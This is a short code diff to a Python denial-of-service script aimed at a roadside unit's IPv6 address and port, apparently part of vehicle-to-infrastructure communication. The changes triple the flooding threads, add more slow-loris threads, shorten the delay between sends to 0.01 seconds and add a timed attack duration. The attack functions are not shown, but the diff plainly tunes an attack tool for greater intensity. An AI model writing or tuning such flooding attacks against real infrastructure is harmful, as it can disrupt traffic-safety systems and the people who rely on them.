@@ -35,20 +35,20 @@ import struct
 # === CONFIGURATION ===
 TARGET_IP = 'fe80::6e5:48ff:fe30:0820'   # RSU IP
 TARGET_PORT = 7002
-INTERFACE_SCOPE_ID = 4                    # Adjust for your NIC
+INTERFACE_SCOPE_ID = 7                    # Adjust for your NIC
 
 # TARGET_IP = 'localhost'
 # TARGET_PORT = 7005
+# from scripts.x2v_constants import *
 
+NUM_FAST = 300      # fast flooding threads
+NUM_SLOW = 300      # slow-loris threads
+ATTACK_DURATION = 8  # seconds to run attack
 
-NUM_FAST = 100      # fast flooding threads
-NUM_SLOW = 200      # slow-loris threads
-
-PAYLOAD_SIZE = 4096  # flood payload size
-DELAY_BETWEEN_SENDS = 0.4  # flood delay (sec)
-
+DELAY_BETWEEN_SENDS = 0.01  # flood delay (sec)
 LORIS_INTERVAL = (2, 5)   # slow loris drip interval range (sec)
 
+PAYLOAD_SIZE = 4096  # flood payload size
 VEH_ARRAY_SIZE = 68       # floats per message
 
 # === ATTACK FUNCTIONS ===
@@ -119,8 +119,12 @@ def main():
         time.sleep(0.05)
 
     try:
+        start = time.time()
         while True:
             time.sleep(1)
+            if time.time() - start > ATTACK_DURATION:
+                print("[i] Stopping attack")
+                break
     except KeyboardInterrupt:
         print("\n[i] Attack stopped by user.")
 
